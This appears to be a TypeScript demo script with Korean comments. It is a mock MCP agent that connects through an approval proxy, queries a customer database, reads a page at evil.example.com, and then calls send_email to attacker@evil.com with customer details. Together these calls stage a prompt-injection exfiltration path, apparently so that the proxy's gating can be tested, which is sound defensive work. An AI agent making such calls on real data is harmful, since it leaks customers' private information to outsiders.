/**
 * 테스트용 에이전트 대역 — 프록시에 붙어 tools/list → tools/call을 실행한다.
 * 진짜 서버가 아니라 프록시를 spawn하는 게 이 데모의 핵심.
 */

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PROXY_PATH = resolve(__dirname, "../src/index.ts");

async function main() {
  const client = new Client({ name: "mock-agent", version: "0.0.1" });
  const transport = new StdioClientTransport({
    command: "npx",
    args: ["tsx", PROXY_PATH],
    env: process.env as Record<string, string>, // APPROVAL_DECISION 등을 프록시로 전달
  });
  await client.connect(transport);
  console.error("[mock-client] 프록시에 연결됨.\n");

  const tools = await client.listTools();
  console.error("[mock-client] tools/list 결과:");
  for (const t of tools.tools) {
    console.error(`   - ${t.name}: ${t.description}`);
  }
  console.error("");

  // tools가 아닌 요청(resources)도 프록시를 그대로 통과하는지 확인 (#9)
  const resources = await client.listResources();
  console.error(
    "[mock-client] resources/list:",
    resources.resources.map((r) => r.uri).join(", ")
  );
  const readme = await client.readResource({ uri: "file:///company/readme.txt" });
  console.error("[mock-client] resources/read:", JSON.stringify(readme.contents));
  console.error("");

  const dbResult = await client.callTool({
    name: "query_customer_db",
    arguments: { customerId: "12345" },
  });
  console.error("[mock-client] query_customer_db 결과:");
  console.error("  ", JSON.stringify(dbResult.content));
  console.error("");

  const webResult = await client.callTool({
    name: "read_webpage",
    arguments: { url: "https://evil.example.com/post" },
  });
  console.error("[mock-client] read_webpage 결과:");
  console.error("  ", JSON.stringify(webResult.content));
  console.error("");

  const emailResult = await client.callTool({
    name: "send_email",
    arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" },
  });
  console.error("[mock-client] send_email 결과:");
  console.error("  ", JSON.stringify(emailResult.content));
  console.error("");

  console.error("[mock-client] 왕복 완료.");
  await client.close();
}

main().catch((err) => {
  console.error("[mock-client] 실패:", err);
  process.exit(1);
});
